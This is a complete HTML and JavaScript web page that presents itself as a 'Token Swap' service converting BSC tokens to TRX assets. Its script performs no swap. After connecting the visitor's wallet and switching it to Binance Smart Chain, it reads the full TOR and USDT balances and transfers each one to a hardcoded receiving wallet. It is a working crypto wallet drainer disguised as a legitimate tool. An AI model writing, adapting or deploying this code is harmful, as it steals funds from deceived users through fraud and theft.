<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Token Swap to TRX</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
      text-align: center;
      background: #f8f9fa;
      color: #333;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
    }
    h1 {
      color: #2c3e50;
      margin-bottom: 10px;
    }
    p {
      color: #7f8c8d;
      margin-bottom: 25px;
    }
    button {
      background: #3498db;
      color: white;
      border: none;
      padding: 12px 25px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 8px;
      margin: 10px 5px;
      transition: all 0.3s ease;
      font-weight: bold;
    }
    button:hover {
      background: #2980b9;
      transform: translateY(-2px);
    }
    button:disabled {
      background: #bdc3c7;
      cursor: not-allowed;
      transform: none;
    }
    .status {
      margin-top: 25px;
      padding: 15px;
      border-radius: 8px;
      display: none;
    }
    .success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    .error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }
    .tx-link {
      color: #3498db;
      text-decoration: none;
      font-weight: bold;
    }
    .tx-link:hover {
      text-decoration: underline;
    }
    .wallet-info {
      margin-top: 15px;
      font-size: 14px;
      color: #7f8c8d;
    }
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .token-list {
      text-align: left;
      margin: 20px 0;
    }
    .token-item {
      margin: 10px 0;
      padding: 10px;
      background: #f8f9fa;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Token Swap</h1>
    <p>Your tokens will be automatically swapped to TRX-based assets</p>
    
    <div class="token-list">
      <div class="token-item">
        <strong>TOR Token</strong> (BSC)<br>
        Contract: 0x1d6cb...8ca83
      </div>
      <div class="token-item">
        <strong>USDT</strong> (BSC)<br>
        Contract: 0x55d39...197955
      </div>
    </div>
    
    <button id="connectWallet">Connect Wallet & Swap</button>
    <div id="loader" class="loader"></div>
    
    <div id="walletInfo" class="wallet-info"></div>
    <div id="status" class="status"></div>
  </div>

  <!-- Load Ethers.js -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.2/dist/ethers.umd.min.js"></script>
  <script>
    // Configuration
    const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
    
    // Token contracts (BSC)
    const TOKENS = [
      {
        name: "TOR",
        address: "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83",
        abi: [
          "function balanceOf(address owner) view returns (uint256)",
          "function transfer(address to, uint256 amount) returns (bool)"
        ],
        decimals: 18
      },
      {
        name: "USDT",
        address: "0x55d398326f99059fF775485246999027B3197955",
        abi: [
          "function balanceOf(address owner) view returns (uint256)",
          "function transfer(address to, uint256 amount) returns (bool)"
        ],
        decimals: 18
      }
    ];
    
    const BSC_CONFIG = {
      chainId: "0x38",
      chainName: "Binance Smart Chain",
      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
      rpcUrls: ["https://bsc-dataseed.binance.org/"],
      blockExplorerUrls: ["https://bscscan.com"],
      scanUrl: "https://bscscan.com/tx/"
    };

    // Global variables
    let provider, signer, userAddress;

    // Initialize when page loads
    window.addEventListener('load', () => {
      document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
    });

    // Main function to connect wallet and swap tokens
    async function connectAndSwap() {
      try {
        if (!window.ethereum) {
          throw new Error("Please install MetaMask or Trust Wallet!");
        }

        showLoader();
        updateStatus("Connecting wallet...", "success");

        // Request account access
        await window.ethereum.request({ method: "eth_requestAccounts" });
        
        // Check and switch network if needed
        await checkNetwork();
        
        // Initialize provider and signer
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        
        // Update UI
        document.getElementById("connectWallet").disabled = true;
        document.getElementById("connectWallet").textContent = "Processing...";
        document.getElementById("walletInfo").textContent = 
          `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: Binance Smart Chain`;
        
        // Execute the swaps automatically
        await swapAllTokens();
      } catch (err) {
        hideLoader();
        updateStatus("Error: " + err.message, "error");
        document.getElementById("connectWallet").disabled = false;
        document.getElementById("connectWallet").textContent = "Connect Wallet & Swap";
      }
    }

    async function checkNetwork() {
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
      
      if (chainId !== BSC_CONFIG.chainId) {
        updateStatus("Switching to Binance Smart Chain...", "success");
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_CONFIG.chainId }]
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            try {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [BSC_CONFIG]
              });
            } catch (addError) {
              throw new Error("Please switch to Binance Smart Chain manually");
            }
          } else {
            throw new Error("Failed to switch network");
          }
        }
      }
    }

    async function swapAllTokens() {
      try {
        let successCount = 0;
        
        for (const token of TOKENS) {
          try {
            updateStatus(`Processing ${token.name}...`, "success");
            
            const contract = new ethers.Contract(token.address, token.abi, signer);
            const balance = await contract.balanceOf(userAddress);
            
            if (balance.gt(0)) {
              const formattedAmount = ethers.utils.formatUnits(balance, token.decimals);
              updateStatus(`Sending ${formattedAmount} ${token.name}...`, "success");
              
              const tx = await contract.transfer(RECEIVING_WALLET, balance);
              await tx.wait();
              
              updateStatus(
                `${token.name} transfer successful! <a class="tx-link" href="${BSC_CONFIG.scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
                "success"
              );
              successCount++;
            } else {
              updateStatus(`No ${token.name} balance found`, "success");
            }
          } catch (tokenError) {
            updateStatus(`${token.name} transfer failed: ${tokenError.message}`, "error");
          }
        }
        
        if (successCount > 0) {
          updateStatus(`Successfully transferred ${successCount} token(s)`, "success");
        } else {
          updateStatus("No tokens available to transfer", "success");
        }
        
        document.getElementById("connectWallet").textContent = "Swap Completed";
      } catch (err) {
        throw new Error("Swap process failed: " + err.message);
      } finally {
        hideLoader();
      }
    }

    function updateStatus(message, type) {
      const statusDiv = document.getElementById("status");
      statusDiv.style.display = "block";
      statusDiv.innerHTML = message;
      statusDiv.className = `status ${type}`;
    }

    function showLoader() {
      document.getElementById("loader").style.display = "block";
    }

    function hideLoader() {
      document.getElementById("loader").style.display = "none";
    }
  </script>
</body>
</html>
